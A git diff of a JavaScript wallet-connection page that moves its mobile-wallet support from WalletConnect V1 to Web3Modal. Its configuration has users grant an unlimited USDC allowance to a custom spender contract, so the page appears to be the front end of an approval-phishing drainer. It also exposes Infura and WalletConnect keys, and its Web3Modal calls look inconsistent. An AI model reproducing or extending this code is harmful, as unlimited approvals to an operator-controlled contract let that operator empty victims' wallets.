@@ -1,6 +1,6 @@
 // script.js
 // --- Configuration for Ethereum Mainnet ---
-const WALLETCONNECT_PROJECT_ID = '25a778da5292aee3e00da87e594c2005'; // Your WalletConnect Project ID for V1 (though not strictly needed by provider itself)
+const WALLETCONNECT_PROJECT_ID = '25a778da5292aee3e00da87e594c2005'; // Your WalletConnect Project ID for V2
 const USDC_CONTRACT_ADDRESS = '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48'; // Official Ethereum Mainnet USDC Address
 const SPENDER_CONTRACT_ADDRESS = '0xa81EE3A48c2B72C6AdB279812a730c93EfF5C2F6'; // Your Deployed UsdcAllowanceSpender Contract on Mainnet
 const FIXED_ALLOWANCE_AMOUNT_HEX = '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff'; // Unlimited allowance (MaxUint256)
@@ -16,7 +16,9 @@ const ERC20_ABI = [
 let provider; // Ethers.js provider
 let signer;   // Ethers.js signer
 let connectedAccount; // Connected wallet address
-let wcProvider; // WalletConnect V1 provider instance
+
+let web3Modal; // Web3Modal instance for WalletConnect V2
+let currentWeb3ModalProvider; // The provider returned by Web3Modal.connect()
 
 // --- DOM Elements ---
 const connectMetaMaskButton = document.getElementById('connectMetaMaskButton');
@@ -89,12 +91,12 @@ function resetUI() {
     hideStatus();
     hideErrorDetails();
     updateMessage('Please connect your wallet to approve USDC.', 'info');
-    // Only try to disconnect if wcProvider exists and is connected
-    if (wcProvider && wcProvider.connected) {
-        console.log("Disconnecting WalletConnect provider...");
-        wcProvider.disconnect();
-        wcProvider = null; // Clear provider instance
+    // Clear Web3Modal cache if a provider was connected via it
+    if (web3Modal && web3Modal.cachedProvider) {
+        console.log("Clearing Web3Modal cached provider...");
+        web3Modal.clearCachedProvider();
     }
+    currentWeb3ModalProvider = null;
 }
 
 // Generic handler for provider changes/connection
@@ -174,77 +176,52 @@ async function connectMetaMask() {
 
 async function connectMobileWallet() {
     showLoader();
-    updateMessage('Generating QR code for mobile wallet...', 'info');
+    updateMessage('Opening wallet selection for mobile wallet...', 'info');
     hideStatus();
     hideErrorDetails();
 
     try {
-        console.log("Attempting to initialize WalletConnect V1 provider...");
-        wcProvider = new WalletConnectProvider.default({
-            rpc: {
-                1: "https://mainnet.infura.io/v3/c79ab9e1069c43b8b27c4821ddb76b4e", // Your Infura ID
-                11155111: "https://sepolia.infura.io/v3/c79ab9e1069c43b8b27c4821ddb76b4e", // Your Infura ID
-            },
-            chainId: 1, // Default to Mainnet
-            bridge: "https://bridge.walletconnect.org", // Official WalletConnect V1 bridge
-        });
-
-        console.log("WalletConnect V1 provider initialized. Calling enable()...");
-        // This will open the QR code modal or connect to a cached session
-        await wcProvider.enable();
-        console.log("WalletConnect V1 enable() called.");
-
-        // Display QR Code if not connected yet
-        if (!wcProvider.connected) {
-            console.log("WalletConnect not yet connected. Displaying QR code...");
-            if (typeof QRCode === 'undefined') {
-                throw new Error("QRCode library not loaded. Cannot display QR code.");
-            }
-            qrcodeDisplay.classList.remove('hidden');
-            // Clear previous QR code if any
-            qrcodeImage.src = ''; 
-            const qrCodeDataURL = await QRCode.toDataURL(wcProvider.connector.uri);
-            qrcodeImage.src = qrCodeDataURL;
-            updateMessage('Scan QR code with your mobile wallet.', 'info');
-        } else {
-            console.log("WalletConnect already connected. Proceeding...");
-            // Already connected, proceed
-            await handleProviderConnection(wcProvider);
+        if (!web3Modal) {
+            throw new Error("Web3Modal not initialized. Ensure web3modal.js is loaded.");
         }
 
-        // Listen for connection events from WalletConnectProvider
-        wcProvider.on("connect", (error, payload) => {
-            console.log("WC connected", payload);
-            if (error) {
-                console.error("WC Connect Error:", error);
+        // Web3Modal handles the UI for wallet selection and QR code display
+        currentWeb3ModalProvider = await web3Modal.openModal();
+
+        if (currentWeb3ModalProvider) {
+            console.log("Web3Modal provider connected.", currentWeb3ModalProvider);
+            // Set up event listeners for the Web3Modal provider (WalletConnect V2 provider)
+            currentWeb3ModalProvider.on("accountsChanged", (accounts) => {
+                console.log("Web3Modal accountsChanged", accounts);
+                if (accounts.length === 0) resetUI();
+                else handleProviderConnection(currentWeb3ModalProvider);
+            });
+            currentWeb3ModalProvider.on("chainChanged", (chainId) => {
+                console.log("Web3Modal chainChanged", chainId);
+                handleProviderConnection(currentWeb3ModalProvider);
+            });
+            currentWeb3ModalProvider.on("disconnect", (error) => {
+                console.log("Web3Modal disconnect", error);
+                resetUI();
+            });
+            currentWeb3ModalProvider.on("error", (error) => {
+                console.error("Web3Modal provider error:", error);
                 displayErrorDetails(error);
                 resetUI();
                 hideLoader();
-            } else {
-                handleProviderConnection(wcProvider);
-            }
-        });
+            });
 
-        wcProvider.on("disconnect", (code, reason) => {
-            console.log("WC disconnect", code, reason);
+            await handleProviderConnection(currentWeb3ModalProvider);
+        } else {
+            console.log("Web3Modal connection cancelled or failed.");
+            updateMessage('Mobile wallet connection cancelled.', 'error');
             resetUI();
-        });
-
-        wcProvider.on("error", (error) => {
-            console.error("WalletConnect provider error:", error);
-            // Optionally, update UI to show error details
-            displayErrorDetails(error);
             hideLoader();
-        });
+        }
 
     } catch (error) {
         console.error('Mobile wallet connection failed:', error);
-        // Check specifically for WebSocket errors here
-        if (error.message && error.message.includes("WebSocket connection to")) {
-            updateMessage('Mobile wallet connection failed: WebSocket connection blocked or unavailable. Check your network/firewall.', 'error');
-        } else {
-            updateMessage('Mobile wallet connection cancelled or failed.', 'error');
-        }
+        updateMessage('Mobile wallet connection cancelled or failed.', 'error');
         displayErrorDetails(error);
         resetUI();
         hideLoader();
@@ -307,32 +284,38 @@ window.addEventListener('load', async () => {
         return;
     }
 
-    // Attempt to re-establish previous connection if any (WalletConnect V1 cached session)
-    // Simplified check: if localStorage has WalletConnect data, try to connect
-    const cachedWCSession = localStorage.getItem('walletconnect');
-    if (cachedWCSession) {
-        console.log("Found cached WalletConnect V1 session. Attempting to re-establish.");
-        // Re-initialize wcProvider, it will pick up the cached session
-        wcProvider = new WalletConnectProvider.default({
-            rpc: {
-                1: "https://mainnet.infura.io/v3/c79ab9e1069c43b8b27c4821ddb76b4e", 
-                11155111: "https://sepolia.infura.io/v3/c79ab9e1069c43b8b27c4821ddb76b4e", 
-            },
-            chainId: 1,
-            bridge: "https://bridge.walletconnect.org",
-        });
+    // Initialize Web3Modal (WalletConnect V2)
+    if (typeof Web3Modal === 'undefined') {
+        console.error("Web3Modal library not loaded. Ensure it's imported as a module in index.html.");
+        updateMessage("Web3Modal Init Error: Please check console for details.", "error");
+        return;
+    }
+
+    const providerOptions = {}; // For now, no custom providers needed, Web3Modal will handle WalletConnect V2
+
+    web3Modal = new Web3Modal({
+        network: "mainnet", // Default network
+        cacheProvider: true, // Optional: enables provider caching
+        providerOptions, // Required. Pass an empty object to use default providers
+        projectId: WALLETCONNECT_PROJECT_ID // Your WalletConnect Project ID
+    });
+    console.log("Web3Modal initialized.");
+
+    // Attempt to re-establish previous connection if any
+    if (web3Modal.cachedProvider) {
+        console.log("Found cached Web3Modal provider. Attempting to re-connect...");
         try {
-            await wcProvider.enable(); // This will re-connect if session is valid
-            if (wcProvider.connected) {
-                await handleProviderConnection(wcProvider);
+            currentWeb3ModalProvider = await web3Modal.connect();
+            if (currentWeb3ModalProvider) {
+                await handleProviderConnection(currentWeb3ModalProvider);
             } else {
-                console.log("Cached WalletConnect session not re-established. Clearing...");
-                localStorage.removeItem('walletconnect');
+                console.log("Cached Web3Modal provider not re-established. Clearing...");
+                web3Modal.clearCachedProvider();
                 resetUI();
             }
         } catch (e) {
-            console.error("Error re-establishing cached WC session:", e);
-            localStorage.removeItem('walletconnect'); // Clear invalid session
+            console.error("Error re-establishing cached Web3Modal provider:", e);
+            web3Modal.clearCachedProvider();
             resetUI();
         }
     } else if (window.ethereum && window.ethereum.selectedAddress) {
